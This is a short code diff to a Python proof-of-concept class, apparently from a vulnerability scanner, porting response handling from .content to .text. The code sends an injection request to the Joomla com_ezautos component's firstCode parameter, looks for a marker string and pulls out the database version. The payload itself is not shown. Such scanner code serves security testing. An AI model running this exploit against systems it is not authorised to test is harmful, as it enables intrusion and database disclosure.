@@ -54,7 +54,7 @@ class Poc(ABPoc):
             exploit = '/index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode='
             # 构造访问地址
             vul_url = arg + exploit + payload
-            response = requests.get(vul_url).content
+            response = requests.get(vul_url).text
             # 自定义的HTTP头
             httphead = {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
@@ -66,8 +66,8 @@ class Poc(ABPoc):
             # 访问
             resp = requests.get(url=vul_url, headers=httphead, timeout=50)
             # 检查是否有特殊字符串
-            if '$~~~$' in resp.content:
-                match = re.search(par, resp.content, re.I | re.M)
+            if '$~~~$' in resp.text:
+                match = re.search(par, resp.text, re.I | re.M)
                 if match:
                     self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                         target=self.target, name=self.vuln.name))
@@ -87,7 +87,7 @@ class Poc(ABPoc):
             exploit = '/index.php?option=com_ezautos&Itemid=49&id=1&task=helpers&firstCode='
             # 构造访问地址
             vul_url = arg + exploit + payload
-            response = requests.get(vul_url).content
+            response = requests.get(vul_url).text
             # 自定义的HTTP头
             httphead = {
                 'User-Agent': 'Mozilla/5.0 (Windows NT 6.2; rv:16.0) Gecko/20100101 Firefox/16.0',
@@ -99,8 +99,8 @@ class Poc(ABPoc):
             # 访问
             resp = requests.get(url=vul_url, headers=httphead, timeout=50)
             # 检查是否有特殊字符串
-            if '$~~~$' in resp.content:
-                match = re.search(par, resp.content, re.I | re.M)
+            if '$~~~$' in resp.text:
+                match = re.search(par, resp.text, re.I | re.M)
                 if match:
                     # 数据库版本
                     dbversion = match.group(1)
